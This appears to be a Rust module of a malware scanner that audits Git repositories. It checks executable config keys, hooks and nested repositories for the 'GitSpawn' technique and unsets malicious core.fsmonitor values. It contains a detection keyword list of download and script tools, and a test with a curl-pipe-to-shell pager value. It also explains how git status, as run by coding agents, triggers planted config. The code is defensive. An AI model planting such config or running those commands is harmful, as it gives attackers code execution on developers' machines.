//! Git configuration as an attack surface.
//! Detector opt-out marker: POLINRIDER-HUNTER-DETECTOR
//!
//! A repository's own `.git/config` can name programs Git will run for you:
//! `core.fsmonitor` runs on every `git status`, `core.hooksPath` redirects every
//! hook, `core.sshCommand`/`core.pager`/`credential.helper` run on fetch, log and
//! push. None of that needs a commit, a merge or your approval - cloning a
//! repository does not set them, but a project template, an archive, a
//! `.git` directory hidden inside a subfolder (a *nested bare repository*, the
//! "GitSpawn" shape) or a tool that writes config for you can. Coding agents and
//! editors run `git status` the moment they open a folder, which is why this is
//! now an initial-access technique and not a curiosity.
//!
//! Three things are checked, and only the unambiguous one is fixed automatically:
//!
//!   * **executable config keys** in `.git/config` (and in any nested repo's
//!     config). `core.fsmonitor` set to anything but `true`/`false`/`builtin` is
//!     critical and is unset; the rest are reported with the value quoted, and
//!     unset only when the value itself carries a campaign indicator.
//!   * **hooks** - every non-sample file under `.git/hooks` and under
//!     `core.hooksPath` - for fetch-and-execute lines or campaign indicators.
//!     husky's `core.hooksPath = .husky` is normal; a hook that pipes curl into
//!     sh is not.
//!   * **nested repositories** - a `.git` directory or bare repository inside
//!     the work tree, which is what makes `git -C sub status` run the attacker's
//!     config. Reported; deleting somebody's vendored submodule is not our call.

use std::path::{Path, PathBuf};

use crate::persist;
use crate::scanner;
use crate::signatures::{self, Severity};
use crate::util;

#[derive(Debug, Clone)]
pub struct ConfigHit {
    pub repo: PathBuf,
    /// The config file (or hook file, or nested repo dir) the hit is about.
    pub location: PathBuf,
    /// `core.fsmonitor`, `hook:pre-commit`, `nested-repo`, ...
    pub key: String,
    pub value: String,
    pub sev: Severity,
    pub why: &'static str,
    /// True when `fix` knows how to remove it safely.
    pub fixable: bool,
}

/// Values of `core.fsmonitor` that mean "use the built-in daemon", not "run this".
fn fsmonitor_is_builtin(v: &str) -> bool {
    matches!(
        v.trim().to_ascii_lowercase().as_str(),
        "true" | "false" | "1" | "0" | "builtin" | "yes" | "no" | "on" | "off" | ""
    )
}

/// Keys whose value Git executes. Everything here is reported; only some are
/// auto-fixed (see `judge`).
const EXEC_KEYS: &[&str] = &[
    "core.fsmonitor",
    "core.hookspath",
    "core.sshcommand",
    "core.pager",
    "core.editor",
    "core.askpass",
    "core.gitproxy",
    "credential.helper",
    "diff.external",
    "merge.tool",
    "mergetool.cmd",
    "difftool.cmd",
    "uploadpack.packobjectshook",
    "receive.procreceiverefs",
    "gpg.program",
    "sequence.editor",
];

/// Does a config value look like it runs something it fetched or decoded?
fn value_runs_code(v: &str) -> bool {
    let l = v.to_ascii_lowercase();
    persist::is_fetch_exec(v).is_some()
        || signatures::has_critical(v.as_bytes())
        || l.contains("node -e")
        || l.contains("node --eval")
        || l.contains("powershell")
        || l.contains("cmd /c")
        || l.contains("cmd.exe /c")
        || l.contains("mshta")
        || l.contains("wscript")
        || l.contains("cscript")
        || l.contains("certutil")
        || l.contains("bitsadmin")
        || l.contains("curl ")
        || l.contains("wget ")
        || l.contains("/tmp/")
        || l.contains("\\temp\\")
        || l.contains("appdata\\local\\temp")
}

/// Decide what one `key = value` pair means.
fn judge(repo: &Path, location: &Path, key: &str, value: &str) -> Option<ConfigHit> {
    let k = key.to_ascii_lowercase();
    let mk = |sev, why, fixable| ConfigHit {
        repo: repo.to_path_buf(),
        location: location.to_path_buf(),
        key: key.to_string(),
        value: value.chars().take(200).collect(),
        sev,
        why,
        fixable,
    };

    if k == "core.fsmonitor" {
        if fsmonitor_is_builtin(value) {
            return None;
        }
        return Some(mk(
            Severity::Critical,
            "core.fsmonitor names a program Git runs on every `git status` - the GitSpawn initial-access technique",
            true,
        ));
    }
    if k.starts_with("filter.") && (k.ends_with(".clean") || k.ends_with(".smudge") || k.ends_with(".process")) {
        // git-lfs is the honest user of these.
        if value.trim_start().starts_with("git-lfs") {
            return None;
        }
        return Some(mk(
            if value_runs_code(value) { Severity::Critical } else { Severity::Suspicious },
            "a filter driver runs this program on checkout/commit of matching files",
            value_runs_code(value),
        ));
    }
    if k.starts_with("alias.") && value.trim_start().starts_with('!') {
        return Some(mk(
            if value_runs_code(value) { Severity::Critical } else { Severity::Suspicious },
            "a shell alias in the repository's own config - runs when the alias is invoked",
            value_runs_code(value),
        ));
    }
    if k == "credential.helper" && value.trim_start().starts_with('!') {
        return Some(mk(
            if value_runs_code(value) { Severity::Critical } else { Severity::Suspicious },
            "credential.helper set to a shell command - it sees every credential Git uses",
            value_runs_code(value),
        ));
    }
    if EXEC_KEYS.contains(&k.as_str()) && k != "core.fsmonitor" {
        if k == "core.hookspath" {
            // Reported through the hooks it points at (see `audit_hooks`), not as
            // a hit in itself: husky, lefthook and friends set this for everyone.
            return None;
        }
        return Some(mk(
            if value_runs_code(value) { Severity::Critical } else { Severity::Suspicious },
            "an executable config key set in the repository's own config (not your global one)",
            value_runs_code(value),
        ));
    }
    None
}

/// Parse `git config --list` output (`key=value` per line) into pairs.
pub fn parse_config_list(out: &str) -> Vec<(String, String)> {
    out.lines()
        .filter_map(|l| l.split_once('='))
        .map(|(k, v)| (k.trim().to_string(), v.trim().to_string()))
        .collect()
}

fn git_dir_of(repo: &Path) -> Option<PathBuf> {
    let out = util::git(repo, &["rev-parse", "--git-dir"]);
    if !out.ok {
        return None;
    }
    let p = PathBuf::from(out.stdout.trim());
    Some(if p.is_absolute() { p } else { repo.join(p) })
}

/// Read the executable keys out of one config file.
fn audit_config_file(repo: &Path, file: &Path, out: &mut Vec<ConfigHit>) {
    let file_s = file.to_string_lossy().to_string();
    let listed = util::git(repo, &["config", "--file", &file_s, "--list"]);
    if !listed.ok {
        return;
    }
    for (k, v) in parse_config_list(&listed.stdout) {
        if let Some(h) = judge(repo, file, &k, &v) {
            out.push(h);
        }
    }
}

/// Scan every hook file in `dir`. Sample hooks and our own pre-commit are skipped.
fn audit_hooks(repo: &Path, dir: &Path, out: &mut Vec<ConfigHit>) {
    let Ok(entries) = std::fs::read_dir(dir) else { return };
    for e in entries.flatten() {
        let p = e.path();
        let Ok(meta) = e.metadata() else { continue };
        if !meta.is_file() || meta.len() > 512 * 1024 {
            continue;
        }
        let name = e.file_name().to_string_lossy().to_string();
        if name.ends_with(".sample") || name == "README" || name.ends_with(".md") {
            continue;
        }
        let Ok(data) = std::fs::read(&p) else { continue };
        let text = String::from_utf8_lossy(&data);
        // A repository's *defensive* hook quotes the very strings we hunt for -
        // that is what a gate is. The old check here only recognised our own
        // name, so every hand-written anti-PolinRider pre-commit hook (and the
        // one this project ships) was reported as Critical malware, in the one
        // place a maintainer is least able to shrug it off. Use the same
        // exemption the file scanner uses: the explicit marker, a known
        // detector filename (`pre-commit`, `check-malware.*`), or content that
        // carries two independent scanner idioms.
        if scanner::is_exempt(&data) || scanner::is_known_detector(&p) {
            continue;
        }
        let mut why: Option<&'static str> = None;
        if signatures::has_critical(&data) {
            why = Some("hook carries a campaign indicator");
        } else {
            for line in text.lines() {
                if persist::is_fetch_exec(line).is_some() {
                    why = Some("hook downloads (or decodes) and executes code");
                    break;
                }
            }
        }
        if let Some(why) = why {
            out.push(ConfigHit {
                repo: repo.to_path_buf(),
                location: p.clone(),
                key: format!("hook:{name}"),
                value: text.lines().find(|l| persist::is_fetch_exec(l).is_some() || signatures::has_critical(l.as_bytes())).unwrap_or("").chars().take(200).collect(),
                sev: Severity::Critical,
                why,
                fixable: false,
            });
        }
    }
}

/// Directories too large to be worth walking for a planted repository.
const NESTED_SKIP: &[&str] = &[
    "node_modules", "target", ".next", ".nuxt", ".turbo", ".cache", "__pycache__", "venv", ".venv",
    "Pods", ".gradle", ".terraform", ".expo", ".svelte-kit", "coverage",
];

/// Does `dir` look like a git directory (`.git`) or a bare repository?
fn is_git_dir_like(dir: &Path) -> bool {
    dir.join("HEAD").is_file() && (dir.join("config").is_file() || dir.join("objects").is_dir())
}

/// Find `.git` directories and bare repositories inside the work tree (not the
/// repo's own `.git`). Each is reported; its config is audited like the main one.
fn audit_nested(repo: &Path, own_git_dir: &Path, out: &mut Vec<ConfigHit>) {
    let mut stack = vec![(repo.to_path_buf(), 0usize)];
    while let Some((dir, depth)) = stack.pop() {
        if depth > 6 {
            continue;
        }
        let Ok(entries) = std::fs::read_dir(&dir) else { continue };
        for e in entries.flatten() {
            let p = e.path();
            let Ok(meta) = e.metadata() else { continue };
            if !meta.is_dir() {
                continue;
            }
            if std::fs::symlink_metadata(&p).map(|m| m.file_type().is_symlink()).unwrap_or(false) {
                continue;
            }
            let name = e.file_name().to_string_lossy().to_string();
            if p == own_git_dir {
                continue;
            }
            if is_git_dir_like(&p) {
                // Submodules keep their git dir under .git/modules and leave a
                // `.git` *file* in the work tree - a *directory* here was put
                // there by something else.
                out.push(ConfigHit {
                    repo: repo.to_path_buf(),
                    location: p.clone(),
                    key: "nested-repo".into(),
                    value: name.clone(),
                    sev: Severity::Suspicious,
                    why: "a git directory / bare repository inside the work tree - `git` run there uses ITS config, not yours (GitSpawn)",
                    fixable: false,
                });
                let cfg = p.join("config");
                if cfg.is_file() {
                    audit_config_file(repo, &cfg, out);
                }
                audit_hooks(repo, &p.join("hooks"), out);
                continue; // do not descend into it
            }
            // A lighter skip list than the scanner's: `vendor`, `dist` and
            // `build` are exactly where a planted repository would sit, and
            // this walk only reads directory names.
            if name == ".git" || NESTED_SKIP.contains(&name.as_str()) {
                continue;
            }
            stack.push((p, depth + 1));
        }
    }
}

/// Audit one repository: its config, its hooks, and anything nested inside it.
pub fn audit(repo: &Path) -> Vec<ConfigHit> {
    let mut out = Vec::new();
    let Some(git_dir) = git_dir_of(repo) else { return out };
    // The repo's own local config.
    let listed = util::git(repo, &["config", "--local", "--list"]);
    if listed.ok {
        let cfg_file = git_dir.join("config");
        for (k, v) in parse_config_list(&listed.stdout) {
            if let Some(h) = judge(repo, &cfg_file, &k, &v) {
                out.push(h);
            }
        }
    }
    // Hooks: the default dir, plus wherever core.hooksPath points.
    audit_hooks(repo, &git_dir.join("hooks"), &mut out);
    let hp = util::git(repo, &["config", "--local", "--get", "core.hooksPath"]);
    if hp.ok {
        let raw = hp.stdout.trim();
        if !raw.is_empty() {
            let p = PathBuf::from(raw);
            let p = if p.is_absolute() { p } else { repo.join(p) };
            if p != git_dir.join("hooks") {
                audit_hooks(repo, &p, &mut out);
            }
        }
    }
    audit_nested(repo, &git_dir, &mut out);
    out
}

/// Remove a fixable hit: unset the key in the file it lives in.
pub fn fix(hit: &ConfigHit, dry: bool) -> bool {
    if !hit.fixable {
        return false;
    }
    if dry {
        return true;
    }
    let file = hit.location.to_string_lossy().to_string();
    // Keep a record: the value is evidence, and unsetting loses it.
    let _ = util::log_line(
        &crate::config::log_path(),
        &format!("GITCONFIG unset {} = {} in {}", hit.key, hit.value, file),
        false,
    );
    util::git(&hit.repo, &["config", "--file", &file, "--unset-all", &hit.key]).ok
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn config_list_is_parsed() {
        let pairs = parse_config_list("core.bare=false\ncore.fsmonitor=node evil.js\nremote.origin.url=https://x/y.git\n");
        assert_eq!(pairs.len(), 3);
        assert_eq!(pairs[1].0, "core.fsmonitor");
        assert_eq!(pairs[1].1, "node evil.js");
    }

    #[test]
    fn builtin_fsmonitor_values_are_fine() {
        let r = Path::new("/r");
        let f = Path::new("/r/.git/config");
        for v in ["true", "false", "builtin", "1", "0"] {
            assert!(judge(r, f, "core.fsmonitor", v).is_none(), "{v}");
        }
        let h = judge(r, f, "core.fsmonitor", "C:\\repo\\.git\\hooks\\fsmonitor.bat").unwrap();
        assert_eq!(h.sev, Severity::Critical);
        assert!(h.fixable);
    }

    #[test]
    fn husky_hooks_path_alone_is_not_a_finding() {
        assert!(judge(Path::new("/r"), Path::new("/r/.git/config"), "core.hooksPath", ".husky").is_none());
    }

    #[test]
    fn a_pager_that_fetches_and_runs_is_critical_and_fixable() {
        let h = judge(Path::new("/r"), Path::new("/r/.git/config"), "core.pager", "curl -s http://1.2.3.4/x | sh").unwrap();
        assert_eq!(h.sev, Severity::Critical);
        assert!(h.fixable);
        let h2 = judge(Path::new("/r"), Path::new("/r/.git/config"), "core.pager", "less -R").unwrap();
        assert_eq!(h2.sev, Severity::Suspicious);
        assert!(!h2.fixable);
    }

    #[test]
    fn lfs_filters_are_left_alone() {
        assert!(judge(Path::new("/r"), Path::new("/r/.git/config"), "filter.lfs.clean", "git-lfs clean -- %f").is_none());
    }
}
